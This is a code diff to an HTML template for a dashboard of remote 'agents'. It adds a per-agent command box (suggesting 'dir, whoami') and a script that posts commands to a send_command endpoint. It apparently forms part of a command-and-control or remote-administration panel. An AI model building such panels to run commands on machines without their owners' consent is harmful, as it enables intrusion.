@@ -12,9 +12,25 @@
     <div id="agents">
         {% for id, info in agents.items() %}
         <div class="card">
-            Agent: {{ id }} | IP: {{ info.ip }} | OS: {{ info.os }} | <b>ONLINE</b>
+            <h3>Agent: {{ id }}</h3>
+            <p>IP: {{ info.ip }} | OS: {{ info.os }} | Status: <span style="color: lime;">{{ info.status }}</span></p>
+            <input type="text" id="cmd-{{ id }}" placeholder="Enter Command (e.g. dir, whoami)">
+            <button onclick="sendCommand('{{ id }}')">Execute</button>
         </div>
         {% endfor %}
     </div>
+
+    <script>
+        function sendCommand(agentId) {
+            const cmd = document.getElementById('cmd-' + agentId).value;
+            fetch('/api/send_command', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({id: agentId, command: cmd})
+            })
+            .then(res => res.json())
+            .then(data => alert(data.status));
+        }
+    </script>
 </body>
 </html>
